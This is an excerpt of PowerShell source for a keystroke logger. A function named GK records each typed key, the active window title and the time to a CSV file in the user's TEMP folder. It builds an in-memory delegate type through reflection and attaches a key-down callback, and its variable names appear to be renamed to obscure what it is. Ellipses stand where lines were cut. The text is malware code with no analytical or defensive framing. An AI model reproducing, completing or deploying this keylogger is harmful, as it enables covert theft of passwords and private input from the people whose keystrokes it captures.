function GK {
    ...
    Param (
        ...
        [String]$OutPath = "$($env:TEMP)\out.log",
    ...
    $OutPath = Join-Path (Resolve-Path (Split-Path -Parent $OutPath)) (Split-Path -Leaf $OutPath)

    try { '"TypedKey","WindowTitle","Time"' | Out-File -FilePath $OutPath -Encoding unicode }
    catch { throw $_ }
    ...
    $Script = {
        ...
        function local:Get-DelegateType {
            ...
            $Dubin = [AppDomain]::CurrentDomain
            $FooFolly = New-Object Reflection.AssemblyName('ReflectedDelegate')
            $DullyBilder = $Dubin.DefineDynamicAssembly($FooFolly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $MullyBilder = $DullyBilder.DefineDynamicModule('InMemoryModule', $false)
            $TileBilder = $MullyBilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
            $ColonBilder = $TileBilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
            $ColonBilder.SetImplementationFlags('Runtime, Managed')
            $MotionBilder = $TileBilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
            $MotionBilder.SetImplementationFlags('Runtime, Managed')
        
            $TileBilder.CreateType()
        }
        ...
        $CallbackScript = {
            ...
            if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {
                ...
                Out-File -FilePath $OutPath -Append -InputObject $CSVEntry -Encoding unicode
            }
